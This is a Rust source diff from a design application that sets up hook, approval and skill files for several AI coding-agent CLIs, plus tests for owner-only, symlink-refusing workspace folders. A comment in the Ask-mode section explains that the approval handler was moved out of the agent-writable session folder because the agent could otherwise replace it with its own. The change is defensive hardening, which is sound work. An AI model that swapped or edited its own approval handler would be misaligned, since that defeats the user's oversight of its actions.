+            eprintln!("design:os studio: no hook can report for this session, so its agent tabs show no status: {e}");
+            None
+        }
+    };
+    let grok_hooks_bytes = match &hook_paths {
+        Some(paths) => serde_json::to_vec_pretty(&session_hooks_settings(paths, None, false)),
+        None => serde_json::to_vec_pretty(&hooks_without_a_folder(None)),
+    }
+    .map_err(invalid_data)?;
+    let agy_hooks_bytes = match &hook_paths {
+        Some(paths) => serde_json::to_vec_pretty(&agy_session_hooks(paths)),
+        None => serde_json::to_vec_pretty(&serde_json::json!({})),
+    }
+    .map_err(invalid_data)?;
+    let set_aside_note = match exact {
+        Some(ExactProjectConfig::Grok) => {
+            let config = grok_session_config_toml(&mcp_config).unwrap_or_default();
+            crate::agent_project_config::make_grok_config_exact(&job.session_dir, config.as_bytes(), &grok_hooks_bytes)?
+        }
+        Some(ExactProjectConfig::Antigravity) => {
+            crate::agent_project_config::make_agy_config_exact(&job.session_dir, &agy_hooks_bytes, AGY_PLUGIN_MANIFEST, &bytes)?
+        }
+        None => None,
+    };
+    moved_aside.clone_from(&set_aside_note);
+    if exact != Some(ExactProjectConfig::Antigravity) {
+        write_agy_session_plugin(&job.session_dir, &bytes)?;
+    }
+    // Every other file is written whatever this one's result is; it is reported last, and an Ask-mode Gemini tab refuses to start on it.
+    let gemini_config = write_gemini_session_config(&job.session_dir, &mcp_config);
+    if exact != Some(ExactProjectConfig::Grok) {
+        write_grok_session_config(&job.session_dir, &mcp_config)?;
+    }
+    if let Some(dir) = &private_dir {
+        write_private_claude_mcp_config(dir, &mcp_config);
+    }
 
     let page_context = page_context_json(&job.session_id, &job.doc_name, job.file_path.as_deref(), job.current_page_id, &job.current_page_name);
     // Claude's reply to a prompt hook: the page as `additionalContext`, nothing that could block the prompt.
-    let context_reply_path = job.session_dir.join("page-context-reply.json");
     let context_reply = serde_json::json!({
         "hookSpecificOutput": {
             "hookEventName": "UserPromptSubmit",
@@ -4603,34 +5640,53 @@ pub(crate) fn write_session_agent_files_for_job(job: &crate::agent_session_files
         }
     });
     let reply_bytes = serde_json::to_vec_pretty(&context_reply).map_err(invalid_data)?;
-    atomic_write_session_file(&context_reply_path, &reply_bytes)?;
+    if let Some(paths) = &hook_paths {
+        atomic_write_session_file(&paths.page_reply(), &reply_bytes)?;
+    }
 
-    let bootstrap_reply_path = job.session_dir.join("bootstrap-context-reply.json");
-    let delivered_marker_path = job.session_dir.join(format!("bootstrap.delivered.{}", job.bootstrap_run_id));
-    let status_path = job.session_dir.join("agent-status.json");
-    let approve_script_path = job.ask_mode.then(|| crate::agent_permissions::write_approval_hook_script(&job.session_dir));
-    let transcript_capture_path = job.session_dir.join(crate::agent_usage::CLAUDE_TRANSCRIPT_META_FILENAME);
-    let claude_hooks = session_hooks_settings_with_approval(
-        &status_path,
-        Some((&context_reply_path, &bootstrap_reply_path, &delivered_marker_path)),
-        approve_script_path.as_deref(),
-        Some(&transcript_capture_path),
-    );
+    // Ask mode: the hook script and the hooks file that names it go to the Studio-private channel folder, the script first.
+    // Claude reads that file (not one in the session folder, which the agent can write), so the agent cannot swap the
+    // approval handler for its own. When the folder is not there (no private data folder, or it cannot be made private)
+    // nothing is installed: Claude starts with the inline settings `{}` and asks in its own terminal prompt.
+    let approve_script_path = private_dir.as_deref().and_then(|dir| {
+        match crate::agent_permissions::install_hook_script(dir, hook_paths.as_ref().map(|paths| paths.status()).as_deref(), job.ask_risky) {
+            Ok(path) => Some(path),
+            Err(e) => {
+                eprintln!("design:os studio: in-panel approvals are off for this session, Claude will ask in its terminal: {e}");
+                None
+            }
+        }
+    });
+    let claude_hooks = match &hook_paths {
+        Some(paths) => session_hooks_settings_with_approval(paths, Some(job.bootstrap_run_id), approve_script_path.as_deref(), true),
+        None => hooks_without_a_folder(approve_script_path.as_deref()),
+    };
     let hooks_bytes = serde_json::to_vec_pretty(&claude_hooks).map_err(invalid_data)?;
-    atomic_write_session_file(&job.session_dir.join("hooks.json"), &hooks_bytes)?;
+    if job.ask_mode {
+        if let Some(dir) = &private_dir {
+            let hooks_path = dir.join(crate::agent_approval_channel::HOOKS_FILE_NAME);
+            if let Err(e) = crate::agent_approval_channel::write_owner_only_file(&hooks_path, &hooks_bytes, false) {
+                eprintln!("design:os studio: could not write Claude's hooks to {}: {e}", hooks_path.display());
+            }
+        }
+        // An earlier build wrote the hooks, approval handler included, into the session folder; nothing reads them now.
+        crate::agent_permissions::remove_stale_session_hooks(&job.session_dir);
+    } else {
+        atomic_write_session_file(&job.session_dir.join("hooks.json"), &hooks_bytes)?;
+    }
 
-    let grok_hooks_bytes = serde_json::to_vec_pretty(&session_hooks_settings(&status_path, None, None)).map_err(invalid_data)?;
-    atomic_write_session_file(&job.session_dir.join(".grok").join("hooks").join("designos-status.json"), &grok_hooks_bytes)?;
-
-    let agy_hooks_bytes = serde_json::to_vec_pretty(&agy_session_hooks(&status_path)).map_err(invalid_data)?;
-    atomic_write_session_file(&job.session_dir.join(".agents").join("hooks.json"), &agy_hooks_bytes)?;
+    if exact != Some(ExactProjectConfig::Grok) {
+        atomic_write_session_file(&job.session_dir.join(".grok").join("hooks").join("designos-status.json"), &grok_hooks_bytes)?;
+    }
+    if exact != Some(ExactProjectConfig::Antigravity) {
+        atomic_write_session_file(&job.session_dir.join(".agents").join("hooks.json"), &agy_hooks_bytes)?;
+    }
 
     // The session `SKILL.md` carries the rules pack for the tools this session enables.
     let rules_body = session_rules_pack(custom_tools.as_ref().map(|custom| &custom.enabled));
     let selection_spec_path = job.session_dir.join("selection.spec.json");
+    // The skill is loaded by the CLIs by themselves and holds no document or page name (see `format_session_skill_md`).
     let skill_md = designos_mcp::rules::format_session_skill_md(
-        &job.doc_name,
-        &job.current_page_name,
         &job.session_id,
         job.current_page_id,
         &job.live_canvas_path,
@@ -4643,18 +5699,58 @@ pub(crate) fn write_session_agent_files_for_job(job: &crate::agent_session_files
     );
     atomic_write_session_file(&job.session_dir.join("SKILL.md"), skill_md.as_bytes())?;
     atomic_write_session_file(&job.session_dir.join(".claude/skills/designos-studio/SKILL.md"), skill_md.as_bytes())?;
+    // An Ask-mode Claude loads no project skills (`--setting-sources user`), so the same skill is also written, as a plugin,
+    // to the private folder its `--plugin-dir` names. Skip-mode tabs keep reading the copy above.
+    if job.ask_mode {
+        if let Some(plugin_dir) = private_dir.as_deref().map(|dir| dir.join(crate::agent_approval_channel::CLAUDE_PLUGIN_DIR_NAME)) {
+            if let Err(e) = crate::agent_permissions::write_claude_plugin(&plugin_dir, skill_md.as_bytes()) {
+                eprintln!("design:os studio: could not write Studio's skill for Claude to {}: {e}", plugin_dir.display());
+            }
+        }
+    }
     atomic_write_session_file(&job.session_dir.join(".agents/skills/designos-studio/SKILL.md"), skill_md.as_bytes())?;
     // Codex, Grok, Antigravity, Gemini CLI, and OpenCode read `AGENTS.md` / `GEMINI.md` from their cwd (the session dir).
     atomic_write_session_file(&job.session_dir.join("AGENTS.md"), skill_md.as_bytes())?;
-    atomic_write_session_file(&job.session_dir.join("GEMINI.md"), skill_md.as_bytes())
+    atomic_write_session_file(&job.session_dir.join("GEMINI.md"), skill_md.as_bytes())?;
+    // The CLI whose tab is starting has had every one of its files checked above; another CLI's Gemini settings are not its concern.
+    let note = join_notes(set_aside_note, workspace_note);
+    if exact.is_some() {
+        return Ok(note);
+    }
+    gemini_config.map(|()| note)
 }
 
-/// Shell command that appends one wrapped hook record to `<session_dir>/agent-events.jsonl` (`#683` §3.1)
-/// and updates `agent-status.json` for legacy status readers.
-fn status_hook_command(status_path: &Path, event: &str, state: &str) -> String {
-    let events_path = status_path.parent().map(|p| p.join("agent-events.jsonl")).unwrap_or_else(|| status_path.with_file_name("agent-events.jsonl"));
-    let append_cmd = crate::agent_turn_status::event_append_command(&events_path, event);
-    format!("{append_cmd}; printf '{{\"state\":\"{state}\",\"run_id\":\"%s\"}}\\n' \"${{DESIGNOS_AGENT_RUN_ID:-}}\" > '{}'", status_path.display())
+/// The sentences of `first` and `second` as one note.
+fn join_notes(first: Option<String>, second: Option<String>) -> Option<String> {
+    match (first, second) {
+        (Some(first), Some(second)) => Some(format!("{first} {second}")),
+        (first, second) => first.or(second),
+    }
+}
+
+/// Shell command that appends one wrapped hook record to the events file of the hook folder (`agent_hook_outputs`, `#683` §3.1)
+/// and updates the status file there for legacy status readers.
+fn status_hook_command(paths: &crate::agent_hook_outputs::HookPaths, event: &str, state: &str) -> String {
+    status_hook_command_for_tab(paths, event, state, None)
+}
+
+/// [`status_hook_command`] whose record also names tab `tab` (Gemini CLI's hooks; `None` gives the plain command).
+pub(crate) fn status_hook_command_for_tab(paths: &crate::agent_hook_outputs::HookPaths, event: &str, state: &str, tab: Option<usize>) -> String {
+    let append_cmd = crate::agent_turn_status::event_append_command_for_tab(&paths.events(), event, tab);
+    format!(
+        "{append_cmd}; {{ printf '{{\"state\":\"{state}\",\"run_id\":\"%s\"}}\\n' \"${{DESIGNOS_AGENT_RUN_ID:-}}\" > {}; }} 2>/dev/null || true",
+        crate::agent_turn_status::sh_single_quote(&paths.status().display().to_string())
+    )
+}
+
+/// The hooks of a CLI when no hook has a folder to report to (`HookPaths::prepare` failed): none that writes or reads anything. Only
+/// the approval handler stays, which reports to the channel folder and not to the hook folder.
+fn hooks_without_a_folder(approval_script: Option<&Path>) -> serde_json::Value {
+    let mut hooks = serde_json::Map::new();
+    if let Some(script) = approval_script {
+        hooks.insert("PermissionRequest".into(), serde_json::json!([{ "matcher": "*", "hooks": [crate::agent_permissions::approval_hook_handler(script)] }]));
+    }
+    serde_json::json!({ "hooks": hooks })
 }
 
 fn command_handler_group(command: String, capture_command: Option<&str>) -> serde_json::Value {
@@ -4665,70 +5761,67 @@ fn command_handler_group(command: String, capture_command: Option<&str>) -> serd
     serde_json::json!([{ "matcher": "*", "hooks": hooks }])
 }
 
-/// Session hooks in Claude's settings shape (`{"hooks": {Event: [{matcher, hooks: [...]}]}}`) for the
-/// status channel. With `context_replies` (`(page_reply, bootstrap_reply, marker)`) the prompt hook
-/// prints `bootstrap_reply` once per run (creating `marker`, or `bootstrap-compact-reply.json` if the
-/// background build exceeds `500 ms`) and `page_reply` on subsequent turns (never the selection).
+/// Session hooks in Claude's settings shape (`{"hooks": {Event: [{matcher, hooks: [...]}]}}`) for the status channel, every file
+/// of them in the hook folder `paths` names. With `bootstrap_run` (the run whose first turn gets the bootstrap block) the prompt hook
+/// prints the bootstrap reply once per run (leaving the delivered marker of that run, or printing the compact reply if the
+/// background build exceeds `500 ms`) and the page reply on subsequent turns (never the selection).
 /// Without it the prompt hook prints nothing: Grok reads any stdout that starts with `{` as a decision
 /// (a context reply shows as a failed hook) and discards an allowing hook's context anyway.
-fn session_hooks_settings(status_path: &Path, context_replies: Option<(&Path, &Path, &Path)>, transcript_capture: Option<&Path>) -> serde_json::Value {
-    session_hooks_settings_with_approval(status_path, context_replies, None, transcript_capture)
+fn session_hooks_settings(paths: &crate::agent_hook_outputs::HookPaths, bootstrap_run: Option<u64>, transcript_capture: bool) -> serde_json::Value {
+    session_hooks_settings_with_approval(paths, bootstrap_run, None, transcript_capture)
 }
 
 /// [`session_hooks_settings`] plus, in `Ask` permission mode (`approval_script` is `Some`), `approve-hook.sh` as a second
 /// handler of the `PermissionRequest` group so one request both records the turn status and raises the in-panel approval (`#656`).
 /// With `transcript_capture`, each Claude hook event also includes a capture handler that records
-/// `session_id` and `transcript_path` once per session to `claude-transcript.json` (`#678`).
+/// `session_id` and `transcript_path` once per session to the transcript file of the hook folder (`#678`).
 fn session_hooks_settings_with_approval(
-    status_path: &Path,
-    context_replies: Option<(&Path, &Path, &Path)>,
+    paths: &crate::agent_hook_outputs::HookPaths,
+    bootstrap_run: Option<u64>,
     approval_script: Option<&Path>,
-    transcript_capture: Option<&Path>,
+    transcript_capture: bool,
 ) -> serde_json::Value {
-    let session_dir = status_path.parent().unwrap_or_else(|| Path::new("/tmp"));
-    let mark_path = session_dir.join("turn-marks.jsonl");
-    let patch_path = session_dir.join("doc-patch.jsonl");
-    let cli = if context_replies.is_some() { "claude" } else { "grok" };
-    let start_mark = crate::agent_turn_marks::turn_mark_hook_command(&mark_path, &patch_path, "start", cli);
-    let end_mark = crate::agent_turn_marks::turn_mark_hook_command(&mark_path, &patch_path, "end", cli);
-    let prompt = match context_replies {
-        Some((page_reply, boot_reply, marker)) => {
-            let compact_reply = boot_reply.with_file_name("bootstrap-compact-reply.json");
+    let patch_log = paths.patch_log();
+    let cli = if bootstrap_run.is_some() { "claude" } else { "grok" };
+    let start_mark = crate::agent_turn_marks::turn_mark_hook_command(&paths.turn_marks(), &patch_log, "start", cli);
+    let end_mark = crate::agent_turn_marks::turn_mark_hook_command(&paths.turn_marks(), &patch_log, "end", cli);
+    let prompt = match bootstrap_run {
+        Some(run) => {
+            let quoted = |path: PathBuf| crate::agent_turn_status::sh_single_quote(&path.display().to_string());
+            let (dir, marker, boot, compact, page) = (
+                quoted(paths.dir().to_path_buf()),
+                quoted(paths.delivered_marker(run)),
+                quoted(paths.bootstrap_reply()),
+                quoted(paths.compact_reply()),
+                quoted(paths.page_reply()),
+            );
+            // Over a folder that is gone or refuses writes the hook still ends quietly and with success: it waits for a reply only
+            // while the folder is there, makes the marker in brace form, and a reply it cannot read prints nothing. The marker is made with `true >`,
+            // not `: >`: dash, the `sh` of Linux, ends the whole shell (status 2) when a redirect of a special builtin fails, whatever surrounds it.
             format!(
-                "{}; {}; if [ ! -e '{}' ]; then i=0; while [ ! -f '{}' ] && [ $i -lt 5 ]; do sleep 0.1; i=$((i+1)); done; fi; if [ ! -e '{}' ] && [ -f '{}' ]; then : > '{}'; cat '{}'; elif [ ! -e '{}' ] && [ -f '{}' ]; then : > '{}'; cat '{}'; else cat '{}'; fi",
-                status_hook_command(status_path, "UserPromptSubmit", "working"),
+                "{}; {}; if [ ! -e {marker} ]; then i=0; while [ ! -f {boot} ] && [ -d {dir} ] && [ $i -lt 5 ]; do sleep 0.1; i=$((i+1)); done; fi; if [ ! -e {marker} ] && [ -f {boot} ]; then {{ true > {marker}; }} 2>/dev/null || true; cat {boot} 2>/dev/null || true; elif [ ! -e {marker} ] && [ -f {compact} ]; then {{ true > {marker}; }} 2>/dev/null || true; cat {compact} 2>/dev/null || true; else cat {page} 2>/dev/null || true; fi",
+                status_hook_command(paths, "UserPromptSubmit", "working"),
                 start_mark,
-                marker.display(),
-                boot_reply.display(),
-                marker.display(),
-                boot_reply.display(),
-                marker.display(),
-                boot_reply.display(),
-                marker.display(),
-                compact_reply.display(),
-                marker.display(),
-                compact_reply.display(),
-                page_reply.display()
             )
         }
-        None => format!("{}; {}", status_hook_command(status_path, "UserPromptSubmit", "working"), start_mark),
+        None => format!("{}; {}", status_hook_command(paths, "UserPromptSubmit", "working"), start_mark),
     };
-    let capture_cmd = transcript_capture.map(crate::agent_usage::claude_transcript_capture_command);
+    let capture_cmd = transcript_capture.then(|| crate::agent_usage::claude_transcript_capture_command(&paths.transcript()));
     let cap = capture_cmd.as_deref();
-    let stop_cmd = |event: &str, state: &str| format!("{}; {}", status_hook_command(status_path, event, state), end_mark);
-    let mut permission_request = command_handler_group(status_hook_command(status_path, "PermissionRequest", "waiting"), cap);
+    let stop_cmd = |event: &str, state: &str| format!("{}; {}", status_hook_command(paths, event, state), end_mark);
+    let mut permission_request = command_handler_group(status_hook_command(paths, "PermissionRequest", "waiting"), cap);
     if let (Some(script), Some(handlers)) = (approval_script, permission_request[0]["hooks"].as_array_mut()) {
         handlers.push(crate::agent_permissions::approval_hook_handler(script));
     }
     let mut prompt_group = command_handler_group(prompt, cap);
-    if context_replies.is_some() {
+    if bootstrap_run.is_some() {
         // Attached skills (`#573`) are `additionalContext` of the prompt hook's own handlers, one per chunk of at most 9,500
         // characters (Claude Code caps each string at 10,000), printed from the files of the tab running the hook. Claude
         // receives every handler's `additionalContext`, so the skills never have to share a reply with the page or bootstrap
         // block, which the first-turn branch above prints instead of the page reply. No file, no output, exit 0.
         if let Some(handlers) = prompt_group[0]["hooks"].as_array_mut() {
             handlers.extend(
-                crate::skills::hook_delivery::handler_commands(session_dir)
+                crate::skills::hook_delivery::handler_commands(paths.dir())
                     .into_iter()
                     .map(|command| serde_json::json!({ "type": "command", "command": command })),
             );
@@ -4737,30 +5830,28 @@ fn session_hooks_settings_with_approval(
     serde_json::json!({
         "hooks": {
             "UserPromptSubmit": prompt_group,
-            "PreToolUse": command_handler_group(status_hook_command(status_path, "PreToolUse", "working"), cap),
-            "PostToolUse": command_handler_group(status_hook_command(status_path, "PostToolUse", "working"), cap),
-            "PostToolUseFailure": command_handler_group(status_hook_command(status_path, "PostToolUseFailure", "working"), None),
+            "PreToolUse": command_handler_group(status_hook_command(paths, "PreToolUse", "working"), cap),
+            "PostToolUse": command_handler_group(status_hook_command(paths, "PostToolUse", "working"), cap),
+            "PostToolUseFailure": command_handler_group(status_hook_command(paths, "PostToolUseFailure", "working"), None),
             "PermissionRequest": permission_request,
-            "Notification": command_handler_group(status_hook_command(status_path, "Notification", "waiting"), None),
+            "Notification": command_handler_group(status_hook_command(paths, "Notification", "waiting"), None),
             "Stop": command_handler_group(stop_cmd("Stop", "done"), cap),
             "StopFailure": command_handler_group(stop_cmd("StopFailure", "error"), None),
             "StopCancelled": command_handler_group(stop_cmd("StopCancelled", "stopped"), None),
-            "SessionStart": command_handler_group(status_hook_command(status_path, "SessionStart", "idle"), None),
+            "SessionStart": command_handler_group(status_hook_command(paths, "SessionStart", "idle"), None),
         }
     })
 }
 
 /// Antigravity's `<workspace>/.agents/hooks.json`: named hook, flat handlers for the invocation, tool,
 /// and stop events (`#683` §3.1). Handlers must answer with a JSON object on stdout.
-fn agy_session_hooks(status_path: &Path) -> serde_json::Value {
-    let session_dir = status_path.parent().unwrap_or_else(|| Path::new("/tmp"));
-    let mark_path = session_dir.join("turn-marks.jsonl");
-    let patch_path = session_dir.join("doc-patch.jsonl");
-    let start_mark = crate::agent_turn_marks::turn_mark_hook_command(&mark_path, &patch_path, "start", "agy");
-    let end_mark = crate::agent_turn_marks::turn_mark_hook_command(&mark_path, &patch_path, "end", "agy");
+fn agy_session_hooks(paths: &crate::agent_hook_outputs::HookPaths) -> serde_json::Value {
+    let patch_log = paths.patch_log();
+    let start_mark = crate::agent_turn_marks::turn_mark_hook_command(&paths.turn_marks(), &patch_log, "start", "agy");
+    let end_mark = crate::agent_turn_marks::turn_mark_hook_command(&paths.turn_marks(), &patch_log, "end", "agy");
     let handler = |event: &str, state: &str, mark: Option<&str>| {
         let mark = mark.map(|m| format!("{m}; ")).unwrap_or_default();
-        serde_json::json!([{ "type": "command", "command": format!("{}; {mark}printf '{{}}'", status_hook_command(status_path, event, state)) }])
+        serde_json::json!([{ "type": "command", "command": format!("{}; {mark}printf '{{}}'", status_hook_command(paths, event, state)) }])
     };
     serde_json::json!({
         "designos-status": {
@@ -4783,26 +5874,378 @@ fn designos_mcp_binary() -> PathBuf {
         .unwrap_or_else(|| PathBuf::from("designos-mcp"))
 }
 
-/// Folder `designos-mcp --workspace` serves: the open file's folder, else Studio's working directory.
-fn session_workspace_dir(file_path: Option<&Path>) -> PathBuf {
-    file_path
-        .and_then(|p| p.parent())
-        .filter(|p| !p.as_os_str().is_empty())
-        .map(|p| p.to_path_buf())
-        .or_else(|| std::env::current_dir().ok())
-        .unwrap_or_else(|| PathBuf::from("."))
+/// Folder name, under Studio's private root, of the workspaces of untitled designs.
+const UNTITLED_WORKSPACES_DIR_NAME: &str = "workspaces";
+
+/// Folder `designos-mcp --workspace` serves: the open file's folder, else a workspace of Studio's own in its private data folder
+/// (`<data dir>/designos/ap/workspaces/studio-<pid>`, owner-only). An untitled document must never inherit the process working
+/// directory (Finder can launch Studio with `/` as its cwd) nor a folder other users can write, such as the temporary folder; when the
+/// private folder cannot be made there is no workspace, and the error says why.
+pub(crate) fn session_workspace_dir(file_path: Option<&Path>) -> std::io::Result<PathBuf> {
+    session_workspace_dir_in(crate::agent_approval_channel::private_root().as_deref(), file_path)
+}
+
+/// [`session_workspace_dir`] with the private root `private_root` (`None` when the platform has none).
+fn session_workspace_dir_in(private_root: Option<&Path>, file_path: Option<&Path>) -> std::io::Result<PathBuf> {
+    if let Some(folder) = file_path.and_then(|p| p.parent()).filter(|p| !p.as_os_str().is_empty()) {
+        return Ok(folder.to_path_buf());
+    }
+    let root = private_root.ok_or_else(|| {
+        std::io::Error::other("no private workspace for this untitled design: Studio's user data folder is missing or inside a temporary folder")
+    })?;
+    let workspaces = root.join(UNTITLED_WORKSPACES_DIR_NAME);
+    let dir = workspaces.join(format!("studio-{}", std::process::id()));
+    // Each level is made and checked before the next one is made in it: a link at any level is refused before anything is made through it.
+    for level in [root, workspaces.as_path(), dir.as_path()] {
+        make_private_level(level).map_err(|e| {
+            let message = format!("no private workspace for this untitled design: {} can't be made private ({e})", level.display());
+            std::io::Error::new(e.kind(), message)
+        })?;
+    }
+    Ok(dir)
+}
+
+/// Makes `level` (owner-only for every folder it creates) and requires it to be a real folder that only its owner can use.
+fn make_private_level(level: &Path) -> std::io::Result<()> {
+    crate::agent_approval_channel::create_private_dir_all(level)?;
+    crate::agent_approval_channel::require_private_dir(level)
+}
+
+#[cfg(all(test, unix))]
+mod workspace_dir_tests {
+    use super::{
+        session_workspace_dir, session_workspace_dir_in, tab_designos_env_map, write_session_agent_files_for_job, AgentCliPreset, PermissionMode, TerminalState,
+    };
+    use crate::agent_approval_channel::{with_private_root_at, without_private_root};
+    use crate::agent_session_files::test_support::tab_state_in;
+    use std::path::{Path, PathBuf};
+
+    /// A root of this test's own under the temp folder, which does not exist yet.
+    fn fresh_root(tag: &str) -> PathBuf {
+        let root = std::env::temp_dir().join(format!("designos-workspace-dir-{tag}-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&root);
+        root
+    }
+
+    #[cfg(unix)]
+    fn mode_of(path: &Path) -> u32 {
+        use std::os::unix::fs::PermissionsExt;
+        std::fs::symlink_metadata(path).expect("metadata").permissions().mode() & 0o777
+    }
+
+    #[test]
+    fn untitled_workspace_is_studio_owned_and_not_process_cwd() {
+        let workspace = session_workspace_dir(None).expect("untitled workspace");
+        assert!(workspace.ends_with(format!("studio-{}", std::process::id())));
+        assert!(workspace.starts_with(crate::agent_approval_channel::private_root().expect("private root")));
+        assert!(!workspace.starts_with(std::env::temp_dir().join("designos-workspaces")));
+        assert!(workspace.is_dir());
+        assert_ne!(workspace, std::env::current_dir().unwrap());
+        assert_ne!(workspace, Path::new("/"));
+        if let Some(home) = std::env::var_os("HOME") {
+            assert_ne!(workspace, Path::new(&home));
+        }
+
+        let mut st = TerminalState::for_tab(crate::live_sync_tests::unique_tab_id());
+        let _ = std::fs::remove_dir_all(&st.session_dir);
+        std::fs::create_dir_all(&st.session_dir).expect("session dir");
+        st.provision_session_agent_files(None);
+        let raw = std::fs::read_to_string(st.session_dir.join("mcp-config.json")).expect("mcp-config.json");
+        let cfg: serde_json::Value = serde_json::from_str(&raw).expect("valid mcp-config.json");
+        let args = cfg.pointer("/mcpServers/designos/args").and_then(serde_json::Value::as_array).expect("designos args");
+        assert_eq!(args[0].as_str(), Some("--workspace"));
+        let mcp_workspace = Path::new(args[1].as_str().expect("workspace arg"));
+        assert_eq!(mcp_workspace, workspace);
+        assert_ne!(mcp_workspace, Path::new("/"));
+        if let Some(home) = std::env::var_os("HOME") {
+            assert_ne!(mcp_workspace, Path::new(&home));
+        }
+        crate::agent_approval_channel::remove_channel(&st.session_dir);
+        crate::agent_permissions::remove_auto_allow_log(&st.session_dir);
+        let _ = std::fs::remove_dir_all(&st.session_dir);
+    }
+
+    #[test]
+    fn file_backed_workspace_remains_the_file_parent() {
+        let file = Path::new("/tmp/designos-sample/sample.designos");
+        assert_eq!(session_workspace_dir(Some(file)).expect("file folder"), Path::new("/tmp/designos-sample"));
+        // The open file's folder needs no private root.
+        assert_eq!(session_workspace_dir_in(None, Some(file)).expect("file folder"), Path::new("/tmp/designos-sample"));
+    }
+
+    #[test]
+    fn untitled_workspace_lies_in_the_private_root_and_is_owner_only() {
+        let root = fresh_root("owner-only");
+        let workspace = session_workspace_dir_in(Some(&root), None).expect("untitled workspace");
+        assert_eq!(workspace, root.join("workspaces").join(format!("studio-{}", std::process::id())));
+        assert!(workspace.is_dir());
+        assert!(!workspace.starts_with(std::env::temp_dir().join("designos-workspaces")));
+        #[cfg(unix)]
+        for level in [root.as_path(), root.join("workspaces").as_path(), workspace.as_path()] {
+            assert_eq!(mode_of(level), 0o700, "{}", level.display());
+        }
+
+        // The public function reads the private root in force, and a second call finds the folder as it was.
+        with_private_root_at(&root, || {
+            assert_eq!(session_workspace_dir(None).expect("untitled workspace"), workspace);
+        });
+        assert_eq!(session_workspace_dir_in(Some(&root), None).expect("untitled workspace again"), workspace);
+        let _ = std::fs::remove_dir_all(&root);
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn a_looser_workspaces_folder_is_tightened_to_owner_only() {
+        let root = fresh_root("loose");
+        let workspaces = root.join("workspaces");
+        std::fs::create_dir_all(&workspaces).expect("workspaces");
+        {
+            use std::os::unix::fs::PermissionsExt;
+            std::fs::set_permissions(&workspaces, std::fs::Permissions::from_mode(0o777)).expect("loosen");
+        }
+        let workspace = session_workspace_dir_in(Some(&root), None).expect("untitled workspace");
+        assert_eq!(mode_of(&workspaces), 0o700);
+        assert_eq!(mode_of(&workspace), 0o700);
+        let _ = std::fs::remove_dir_all(&root);
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn untitled_workspace_is_refused_when_a_folder_above_it_is_a_link() {
+        use std::os::unix::fs::symlink;
+        let base = fresh_root("link");
+        let elsewhere = base.join("elsewhere");
+        std::fs::create_dir_all(&elsewhere).expect("link target");
+
+        // `workspaces` is a link to a folder somebody else made: nothing is made through it.
+        let root = base.join("root");
+        std::fs::create_dir_all(&root).expect("root");
+        symlink(&elsewhere, root.join("workspaces")).expect("link");
+        let refused = session_workspace_dir_in(Some(&root), None);
+        assert!(refused.is_err(), "a workspace was returned through a link: {refused:?}");
+        assert_eq!(std::fs::read_dir(&elsewhere).expect("target").count(), 0, "something was made through the link");
+
+        // The private root itself is a link.
+        let linked_root = base.join("linked-root");
+        symlink(&elsewhere, &linked_root).expect("link");
+        let refused = session_workspace_dir_in(Some(&linked_root), None);
+        assert!(refused.is_err(), "a workspace was returned through a linked root: {refused:?}");
+        assert_eq!(std::fs::read_dir(&elsewhere).expect("target").count(), 0, "something was made through the linked root");
+        let _ = std::fs::remove_dir_all(&base);
+    }
+
+    #[test]
+    fn untitled_workspace_is_refused_without_a_private_root() {
+        assert!(session_workspace_dir_in(None, None).is_err());
+        without_private_root(|| assert!(session_workspace_dir(None).is_err()));
+    }
+
+    /// Whether the config file `rel` of a session names the `designos` server; `None` when the file is not there.
+    fn names_designos_server(session_dir: &Path, rel: &str) -> Option<bool> {
+        let text = std::fs::read_to_string(session_dir.join(rel)).ok()?;
+        Some(if rel.ends_with(".toml") {
+            text.contains("mcp_servers.designos")
+        } else {
+            serde_json::from_str::<serde_json::Value>(&text).expect("a JSON config").pointer("/mcpServers/designos").is_some()
+        })
+    }
+
+    const CONFIG_FILES: [&str; 4] = ["mcp-config.json", ".grok/config.toml", ".gemini/settings.json", ".agents/plugins/designos/mcp_config.json"];
+
+    #[test]
+    fn every_agent_starts_without_the_designos_server_when_the_untitled_workspace_cannot_be_made() {
+        let titled_dir = fresh_root("titled");
+        std::fs::create_dir_all(&titled_dir).expect("folder of a design file");
+        let file = titled_dir.join("a.designos");
+        let mut problems = Vec::new();
+        without_private_root(|| {
+            for mode in [PermissionMode::Ask, PermissionMode::Skip] {
+                for preset in [AgentCliPreset::Claude, AgentCliPreset::Codex, AgentCliPreset::Grok, AgentCliPreset::Antigravity, AgentCliPreset::Gemini] {
+                    let case = format!("{preset:?} in {mode:?}");
+                    let mut st = tab_state_in(mode);
+                    if let Err(e) = st.spawn_tab_with_registration(preset, None, Some("true"), None, false, None, false, mode) {
+                        problems.push(format!("{case}: the tab does not start: {e}"));
+                        continue;
+                    }
+
+                    // What the user is shown names the cause, and says nothing about files that were in fact written.
+                    let status = st.status_msg.clone().unwrap_or_default();
+                    if !status.starts_with("Spawned") || !status.contains("no private workspace for this untitled design") || status.contains("Couldn't") {
+                        problems.push(format!("{case}: the status does not name the cause of the missing server: {status}"));
+                    }
+
+                    // No config names the server, and the rest of the session's files are written.
+                    let found: Vec<(&str, bool)> =
+                        CONFIG_FILES.iter().filter_map(|rel| names_designos_server(&st.session_dir, rel).map(|named| (*rel, named))).collect();
+                    if !found.iter().any(|(rel, _)| *rel == "mcp-config.json")
+                        || found.iter().any(|(_, named)| *named)
+                        || !st.session_dir.join("SKILL.md").is_file()
+                    {
+                        problems.push(format!("{case}: configs are wrong: {found:?}"));
+                    }
+
+                    // A design with a file has its server, and its start says nothing about a workspace.
+                    let mut titled = tab_state_in(mode);
+                    if let Err(e) = titled.spawn_tab_with_registration(preset, Some(&file), Some("true"), None, false, None, false, mode) {
+                        problems.push(format!("{case}, titled: the tab does not start: {e}"));
+                    } else if names_designos_server(&titled.session_dir, "mcp-config.json") != Some(true)
+                        || titled.status_msg.clone().unwrap_or_default().contains("workspace")
+                    {
+                        problems.push(format!("{case}, titled: lost its server or names a workspace: {:?}", titled.status_msg));
+                    }
+                }
+            }
+
+            // Codex names the folder through the environment: an empty one makes `designos-mcp` refuse to start.
+            let env = tab_designos_env_map(AgentCliPreset::Codex, None, None);
+            if env.get("DESIGNOS_WORKSPACE").map(String::as_str) != Some("") {
+                problems.push(format!("Codex gets a workspace: {:?}", env.get("DESIGNOS_WORKSPACE")));
+            }
+        });
+        let _ = std::fs::remove_dir_all(&titled_dir);
+        assert!(problems.is_empty(), "{problems:#?}");
+    }
